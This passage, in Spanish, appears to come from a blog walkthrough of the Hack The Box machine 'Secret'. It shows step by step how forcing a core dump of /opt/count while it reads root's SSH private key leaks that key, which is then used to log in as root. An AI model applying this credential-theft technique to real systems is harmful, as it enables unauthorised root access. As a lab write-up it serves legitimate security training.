dasith    217477  0.0  0.0   6432   736 pts/2    S+   22:58   0:00 grep --color=auto count
```

Nop y pos claramente no ha sido creado el dump:

```bash
dasith@secret:/tmp/test$ ls -la /var/crash/
total 8
drwxrwxrwt  2 root root 4096 Mar 23 22:53 .
drwxr-xr-x 14 root root 4096 Aug 13  2021 ..
```

Usemos el comando `fg` para ver que pasa si **retomamos** la tarea en segundo plano:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_dasithSH_count_executeBINwith_fg.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Nos saca de una (1), esto debido a que el proceso ya no existe (2) y, por lo tanto, se gener√≥ el dump file (3) (:

Pos rob√©monos el dump y veamos como lidiar con √©l:

```bash
dasith@secret:/tmp/test$ mv /var/crash/_opt_count.1000.crash .
```

En internet encontramos este hilo:

* [How can I read a crash file from **/var/crash**](https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408google_stackoverflow_howTOreadVARCRASHfiles.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

As√≠ que:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_apportUnpack_done.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Todo correcto y deeeentro deber√≠a estar el archivo `CoreDump`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_apportUnpack_lsLA_CodeDump_found.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Efectivamenteeeeee, es un objeto con data binaria, peeero juguemos con `cat` o `strings` para saber si ah√≠ hay info relacionada con el directorio que est√°bamos consultando antes del crash, o sea `/root/.ssh`:

```bash
dasith@secret:/tmp/test/acamismito$ strings CoreDump | grep "ssh"
/root/.ssh/
/root/.ssh//id_rsa.pub
/root/.ssh/
```

Y como quer√≠amos ver que objetos hab√≠a dentro de esa ruta, veamos si est√°n listadas (no su contenido) las llaves que vimos antes:

```bash
dasith@secret:/tmp/test/acamismito$ strings CoreDump | grep "id_rsa"
id_rsa
id_rsa.pub
/root/.ssh//id_rsa.pub
```

Perfeccccctooo, tenemos en el Dump la info que est√°bamos consultando, pero claro tenemos son los nombres de los archivos... ¬øY si volvemos a repetir el proceso del crash, pero esta vez abriendo directamente la llave privada de `root`? Entiendo que el programa la abrir√≠a (para hacer el recuento que hace) yyyy si se genera el crash en ese mismo instante quedara abieeeerta yyyyy, por lo tanto, deber√≠amos verla en el dump! A darle r√°pidamente:

## Obtenemos llave privada SSH del usuario <u>root</u> [üìå](#dump-root-idrsa) {#dump-root-idrsa}

Ejecutamos binario:

```bash
dasith@secret:/tmp/test$ /opt/count 
Enter source file/directory name: /root/.ssh/id_rsa
...
```

Enviamos proceso a segundo plano:

```bash
#CTRL + Z
Save results a file? [y/N]: ^Z
[1]+  Stopped                 /opt/count
```

Buscamos el **PID** del proceso:

```bash
dasith@secret:/tmp/test$ ps auxwww | grep count
root         859  0.0  0.1 235676  7456 ?        Ssl  06:11   0:01 /usr/lib/accountsservice/accounts-daemon
dasith    246295  0.0  0.0   2488   592 pts/2    T    23:29   0:00 /opt/count
dasith    246297  0.0  0.0   6432   736 pts/2    S+   23:29   0:00 grep --color=auto count
```

Matamos el proceso:

```bash
dasith@secret:/tmp/test$ kill -SIGSEGV 246295
```

Retomamos el proceso (muerto) en segundo plano:

```bash
dasith@secret:/tmp/test$ fg
/opt/count
Segmentation fault (core dumped)
```

Se genera el **dump**:

```bash
dasith@secret:/tmp/test$ ls -la /var/crash/
total 40
drwxrwxrwt  2 root   root    4096 Mar 23 23:30 .
drwxr-xr-x 14 root   root    4096 Aug 13  2021 ..
-rw-r-----  1 dasith dasith 31468 Mar 23 23:30 _opt_count.1000.crash
```

```bash
dasith@secret:/tmp/test$ mv /var/crash/_opt_count.1000.crash .
```

Desempacamos el **dump**:

```bash
dasith@secret:/tmp/test$ apport-unpack _opt_count.1000.crash averque
```

```bash
dasith@secret:/tmp/test$ cd averque/
dasith@secret:/tmp/test/averque$ ls 
Architecture  Date           ExecutablePath       _LogindSession  ProcCmdline  ProcEnviron  ProcStatus  Uname
CoreDump      DistroRelease  ExecutableTimestamp  ProblemType     ProcCwd      ProcMaps     Signal      UserGroups
```

Yyyyy la prueba madre:

```bash
dasith@secret:/tmp/test/averque$ strings CoreDump
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_dasithSH_stringsCoreDump_idRSArootCONTENT_found.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

SI SI SIIIIIIIIIIIIIIIIIII! Tenemos la llave privada del usuario `root`, esto nos permite ingresar como √©l sin colocar contrase√±aaaaaaaaaaaaaa :D

* [¬øQue son las llaves SSH?](https://www.stackscale.com/es/blog/configurar-llaves-ssh-servidor-linux/).
* [How to Use SSH Public Key Authentication](https://serverpilot.io/docs/how-to-use-ssh-public-key-authentication/).

As√≠ que copi√©monos toooda la llave y la pegamos en un archivo de nuestra m√°quina:

```bash
‚ù± cat root.id_rsa                                                     
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
```

Le damos los permisos necesarios:

```bash
‚ù± chmod 700 root.id_rsa 
‚ù± ls -la
...
-rwx------ 1 lanz lanz 2602 mar 23 25:25 root.id_rsa
```

Y para probarla como autenticaci√≥n usamos el argumento `-i` de **SSH**:

```bash
‚ù± ssh root@10.10.11.120 -i root.id_rsa
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408bash_rootSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Peeeerfeccccto, tenemos una sesi√≥n por SSH como el usuario `root`, veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/secret/408flags.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Y listooones, bay bay.

...

Una linda m√°quina, lo del dump me gust√≥ bastante, muchos jueguitos ah√≠. No me gusto que no hay relaci√≥n entre el **user path** y el **root path** (o yo no la vi :P), pero bueno, esta rateada como CTF, as√≠ que bien (:

Bueno, pues como siempre gracias por acompa√±arme en este camino y nada, a seguir rompiendo todoooooooooooO!